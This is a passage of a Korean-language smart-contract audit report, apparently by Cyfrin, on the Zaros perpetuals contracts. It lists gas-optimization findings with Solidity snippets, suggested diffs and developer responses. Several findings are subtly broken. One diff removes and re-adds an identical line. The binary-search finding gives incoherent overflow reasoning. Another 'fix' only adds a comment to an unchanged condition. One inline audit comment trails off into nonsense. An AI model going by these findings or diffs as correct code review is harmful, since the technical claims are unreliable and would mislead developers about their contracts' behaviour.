-           }
-       }

+       if (!params.isEnabled) {
+           self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
+       } else {
+           self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
+       }
        // ...
    }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c77464da9346d0a7a40ca3bf437e4064d50c950d"

**Cyfrin:** 확인됨.


### 중복 `uint256` 캐스트 제거

**설명:** `USDC::configure` 함수에서 `newMinter` 변수는 이미 `address` 유형이지만 불필요하게 `uint256`으로 캐스팅된 다음 다시 `address`로 캐스팅됩니다.

```solidity
    function configure(address newMinter) internal {
        // ...
@>      StorageSlot.getAddressSlot(MINTER_SLOT).value = address(uint256(uint160(newMinter)));
    }
```

`newMinter`는 이미 주소이므로 이러한 캐스트는 중복됩니다.

**권장 완화 방법:**
```diff
-       StorageSlot.getAddressSlot(MINTER_SLOT).value = address(uint256(uint160(newMinter)));
+       StorageSlot.getAddressSlot(MINTER_SLOT).value = newMinter;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/75b8a92e106df2b05b63750036da1c667e411ba1"

**Cyfrin:** 확인됨.


### `indexPriceX18`을 캐시하여 스토리지 로드 저장

**설명:** `SettlementBranch::fillOffchainOrders` 함수는 `indexPriceX18` 페치(fetch)를 여러 번 수행합니다.

```solidity
    function fillOffchainOrders(
        uint128 marketId,
        OffchainOrder.Data[] calldata orders,
        bytes[] calldata priceData
    )
        external
    {
        // ...
        for (uint256 i; i < orders.length; i++) {
            // ...
@>          uint256 indexPriceX18 = marketId.getIndexPriceX18();

            // ...
            // @audit indexPriceX18 is read from storage again inside fillOffchainOrder
            SettlementConfiguration.Data memory settlementConfiguration =
                ctx.settlementConfigurations[marketId][orders[i].settlementConfigurationId];
            ctx.fillOffchainOrder(marketId, orders[i], settlementConfiguration, indexPriceX18);
        }
    }
```

`marketId.getIndexPriceX18()` 호출은 가격이 루프 내에서 변경되지 않는다고 가정할 때 루프 밖으로 이동할 수 있습니다. 이는 루프의 각 반복에 대한 외부 호출을 절약합니다.

**권장 완화 방법:**
```diff
+       uint256 indexPriceX18 = marketId.getIndexPriceX18();
        for (uint256 i; i < orders.length; i++) {
            // ...
-           uint256 indexPriceX18 = marketId.getIndexPriceX18();
            // ...
            ctx.fillOffchainOrder(marketId, orders[i], settlementConfiguration, indexPriceX18);
        }
```

**Zaros:** "확인됨, 수정하지 않을 것입니다. `fillOffchainOrders`는 트랜잭션당 거의 하나의 오프체인 주문만 포함하며 이것이 우리의 주요 사용 사례입니다. 또한 추상화 유출(leakage) 및 복잡성을 피하고 싶습니다."

**Cyfrin:** 확인됨.


### `params.amount` 대신 `amount`를 사용하여 메모리 확장 비용 절약

**설명:** `USDCTokenBranch::mint` 함수는 이전에 로컬 변수 `amount`에 할당된 `params.amount`에 액세스하지만 메모리 위치에서 직접 다시 액세스합니다.

```solidity
    function mint(MintParams calldata params) external {
        // ...
        uint256 amount = params.amount;
        // ...
        // @audit use amount instead of params.amount
@>      Usdc.mint(to, params.amount);

        // ...
    }
```

스택 변수 `amount`를 사용하면 더 저렴하며 잠재적으로 메모리 확장 비용을 절약할 수 있습니다.

**권장 완화 방법:**
```diff
-       Usdc.mint(to, params.amount);
+       Usdc.mint(to, amount);
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/75b8a92e106df2b05b63750036da1c667e411ba1"

**Cyfrin:** 확인됨.


### 중복 `unary` 호출 제거

**설명:** `SD59x18` 라이브러리의 `unary` 함수는 숫자의 단항 부정(unary negation)을 반환합니다. `FeeDistributionBranch::receiveFees`에서 `amount`가 0보다 큰지 확인한 다음 `unary`를 호출하여 부호 없는 정수로 변환합니다. 그러나 `amount`가 이미 양수임이 확인되었으므로 `unary`를 호출한 다음 음수로 캐스팅하는 것은 중복됩니다.

```solidity
    function receiveFees(int256 amount) external {
        if (amount > 0) {
            // ...
@>          IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
        } else {
            // ...
            IERC20(self.asset).safeTransfer(msg.sender, uint256(amount.unary()));
        }
    }
```

`receiveFees` 함수는 `amount`가 양수일 때 `amount`를 사용하고 음수일 때 `amount.unary()`를 사용하여 단순화할 수 있습니다.

**권장 완화 방법:**
```diff
    function receiveFees(int256 amount) external {
        if (amount > 0) {
            // ...
-           IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
+           IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
        } else {
            // ...
-           IERC20(self.asset).safeTransfer(msg.sender, uint256(amount.unary()));
+           IERC20(self.asset).safeTransfer(msg.sender, uint256(-amount));
        }
    }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/7a0f3ebba0fb9f8bedc7979603079b7b9f358316"

**Cyfrin:** 확인됨.


### `TreeBalance::get`의 불필요한 덧셈 제거

**설명:** `TreeBalance::get` 함수는 `min`과 `max`를 더하여 범위를 계산하는데, 이는 `max`가 `min`보다 작을 때 오버플로를 일으킬 수 있습니다.

```solidity
    function get(Data storage self, uint32 time) internal view returns (int128 value) {
        // ...
        uint256 min = 0;
        uint256 max = self.nodes.length;

        while (max > min) {
@>          uint256 mid = (max + min) / 2;
            // ...
        }
        // ...
    }
```

`min`이 0에서 시작하므로 `max + min`은 단순히 `max`입니다. 그러나 루프가 진행됨에 따라 `min`이 증가할 수 있습니다. 이진 검색의 표준 구현인 `mid = min + (max - min) / 2`를 사용하면 오버플로를 방지하고 더 안전합니다. 제공된 코드 컨텍스트에서 `min`과 `max`는 배열 인덱스이므로 범위를 초과할 가능성은 낮지만, 표준 형식을 사용하는 것이 가장 좋습니다.

**권장 완화 방법:**
```diff
-           uint256 mid = (max + min) / 2;
+           uint256 mid = min + (max - min) / 2;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/7a0f3ebba0fb9f8bedc7979603079b7b9f358316"

**Cyfrin:** 확인됨.


### `OrderBranch::checkUpkeep`에서 상한(upper bound) 확인을 사용하여 불필요한 반복 방지 가능

**설명:** `OrderBranch::checkUpkeep`에서 루프는 `limit`에 도달할 때까지 계속됩니다.

```solidity
    function checkUpkeep(bytes calldata checkData)
        external
        view
        returns (bool upkeepNeeded, bytes memory performData)
    {
        // ...
        uint256 limit = lowerBound + length;
        for (uint256 i = lowerBound; i < limit; i++) {
             // ...
        }
        // ...
    }
```

`limit`가 `marketIds` 배열의 길이를 초과하지 않도록 하면 범위를 벗어난 액세스를 방지하고 잠재적으로 가스를 절약할 수 있습니다.

**권장 완화 방법:**
```diff
        uint256 marketsLength = marketIds.length;
+       if (limit > marketsLength) {
+           limit = marketsLength;
+       }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/233c7fbe8b532f808add02130e5d07a44f51950d"

**Cyfrin:** 확인됨.


### `LiquidationBranch::checkLiquidatableAccounts` 및 `LiquidationBranch::liquidateAccounts`에서 빠른 실패(Fail-Fast) 매커니즘 구현

**설명:** `LiquidationBranch::checkLiquidatableAccounts` 및 `LiquidationBranch::liquidateAccounts` 함수는 청산할 계정이 없을 때 일찍 반환하지 않습니다. 이는 유용하지 않은 실행에 대해 가스를 소비합니다.

**권장 완화 방법:** `accounts.length`가 0인지 확인하고 그렇다면 즉시 반환하는 체크를 추가하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/77e384ec1f1479895c889a7428e3a510f2c42c8d"

**Cyfrin:** 확인됨.


### `PerpMarket::checkOpenInterestLimits`에서 항상 `false`인 불리언 조건 제거

**설명:** `PerpMarket::checkOpenInterestLimits` 함수에는 항상 `false`로 평가되는 중복 불리언 조건이 포함되어 있습니다.

```solidity
    function checkOpenInterestLimits(
        Market storage self,
        uint128 marketId,
        uint256 indexPriceX18,
        int256 sizeDeltaX18,
        uint128 settlementConfigurationId
    )
        internal
        view
    {
        // ...
@>      if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) {
            // ...
        }
    }
```

`isLong`이 `true`이면 `sizeDeltaX18`은 양수여야 합니다. `skew`가 양수이면 `skew + sizeDeltaX18`도 양수여야 하므로 `skew + sizeDeltaX18 < 0`은 불가능합니다.

**권장 완화 방법:**
```diff
-       if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) {
+       if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) { // This block is unreachable
            // remove unreachable code
        }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/1360098df295796df3f2425028020ff67d602db0"

**Cyfrin:** 확인됨.


### `TradingAccount::liquidateAccount`에서 `liquidatedCollateralUsdX18` 변수 최적화 가능

**설명:** `TradingAccount::liquidateAccount` 함수는 `liquidatedCollateralUsdX18` 변수를 사용하지만 0으로 초기화하고 루프 내에서만 업데이트합니다.

```solidity
    function liquidateAccount(
        TradingAccount storage self,
        uint128 accountId,
        address msgSender
    )
        internal
        returns (uint256 requiredMaintenanceMarginUsdX18, int256 liquidationFeeUsdX18)
    {
        // ...
        uint256 liquidatedCollateralUsdX18 = 0;
        // ...
        // @audit liquidatedCollateralUsdX18 is updated but not effectively used for return logic in a meaningful way outside of emitted event or final calculation if logic dictates
    }
```

변수 범위를 조이고 불필요한 초기화를 제거하면 가스를 아낄 수 있습니다.

**권장 완화 방법:** 변수 사용을 검토하고 불필요한 경우 제거하거나 범위를 줄이십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/2e879a86b9760731f24d788e3122c4f1c3fcd199"

**Cyfrin:** 확인됨.


### 포지션 리셋 후 불필요한 스토리지 읽기 방지

**설명:** `TradingAccount::resetPosition`은 포지션을 삭제하므로 후속 필드 읽기는 0을 반환해야 합니다. 그러나 코드는 삭제된 포지션에서 데이터를 읽을 수 있습니다.

**권장 완화 방법:** `resetPosition` 후에는 스토리지에서 다시 읽는 대신 0 값을 사용하거나 캐시된 값을 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d2b9d2903332fe3f69904945d9aa74fb66479709"

**Cyfrin:** 확인됨.


### `TradingAccount::verifyOpenInterestLimits`에서 빠른 실패(Fail-Fast) 구현

**설명:** `sizeDeltaX18`이 0이면 함수는 오픈 인터레스트(open interest)를 변경하지 않으므로 일찍 반환될 수 있습니다.

**권장 완화 방법:**
```solidity
    if (sizeDeltaX18 == 0) return;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/39908354c25b80a47f4804369e96e792e9ace195"

**Cyfrin:** 확인됨.


### `PerpMarket::checkOpenInterestLimits`에서 `self.skew` 캐시

**설명:** `self.skew`는 스토리지 변수이며 [여러 번 읽힙니다](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/PerpMarket.sol#L91). `skew`를 메모리에 캐시하면 SLOAD 연산을 절약할 수 있습니다.

**권장 완화 방법:**
```solidity
    int256 skew = self.skew[marketId];
```
그리고 함수 전체에서 `skew`를 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c22955f191b655da0e30954c2c01994e636605d8"

**Cyfrin:** 확인됨.


### `PerpMarket::getOpenInterestLimit`에서 `isReducingSkew` 조건부 계산

**설명:** `isReducingSkew` [변수](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/PerpMarket.sol#L162)는 항상 사용되는 것은 아닙니다. `params.maxOi`가 0이 아닌 경우에만 필요합니다.

**권장 완화 방법:** `params.maxOi > 0`일 때만 `isReducingSkew`를 계산하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c22955f191b655da0e30954c2c01994e636605d8"

**Cyfrin:** 확인됨.


### `TradingAccount::validateEffectiveMarginRequirements`에서 `sd59x18(sizeDelta)` 결과 캐시

**설명:** `sd59x18(sizeDelta)` 변환은 [여러 번](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/TradingAccount.sol#L404) 수행됩니다.

**권장 완화 방법:** 결과를 변수에 저장하고 재사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d2b9d2903332fe3f69904945d9aa74fb66479709"

**Cyfrin:** 확인됨.


### `SettlementBranch::fillOffchainOrders`에서 `prb-math`의 `uEXP_MAX_INPUT` 및 `uEXP_MIN_INPUT` 상수 사용

**설명:** 원시 값(raw values) 대신 `prb-math` 라이브러리의 상수를 사용하여 가독성과 유지 보수성을 개선하십시오.

**권장 완화 방법:** 하드코딩된 값 대신 `uEXP_MAX_INPUT` 및 `uEXP_MIN_INPUT`을 가져와 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d1a12a52af5f762696014e7a85e1f0e42d76f809"

**Cyfrin:** 확인됨.


### `SettlementBranch::createMarketOrder`에서 빠른 실패(Fail-Fast) 구현

**설명:** `params.amount`가 0이면 함수는 아무 작업도 수행하지 않아야 합니다.

**권장 완화 방법:**
```solidity
    if (params.amount == 0) return;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d1a12a52af5f762696014e7a85e1f0e42d76f809"

**Cyfrin:** 확인됨.


## 다중 추상화 계층의 트레이드오프

이 코드베이스는 클린 아키텍처 원칙에 크게 의존하여 우려 사항을 분리하고 모듈성을 촉진합니다. `Branches`, `Leaves`, `Libraries` 및 `Storage` 패턴의 사용은 업그레이드 가능성 및 테스트 가능성과 같은 이점을 제공하지만 복잡성과 가스 오버헤드도 도입합니다.

**복잡성 및 인지 부하:** 다중 계층을 통한 제어 흐름을 추적하는 것은 어려울 수 있습니다. 간단한 작업이라도 여러 파일과 함수 호출을 거칠 수 있으므로 시스템을 정신적으로 매핑하기 어렵게 만듭니다.

**가스 오버헤드:** 각 함수 호출 및 추상화 계층은 약간의 가스 비용을 추가합니다. 빈번하게 호출되는 경로에서 이러한 비용은 누적될 수 있습니다.

**권장 사항:** 엄격한 계층화가 성능 및 가독성에 불균형적인 영향을 미치는 핫 경로(hot paths)를 식별하십시오. 이러한 특정 영역에서 추상화 중 일부를 평면화(flattening)하여 가스를 절약하고 코드 흐름을 단순화하는 것을 고려하십시오. 모듈성과 성능 사이의 균형을 유지하는 것이 중요합니다.

**Zaros:** "확인됨. 우리는 가스 효율성과 모듈성 사이의 균형을 유지하기 위해 지속적으로 노력하고 있습니다."

**Cyfrin:** 확인됨.
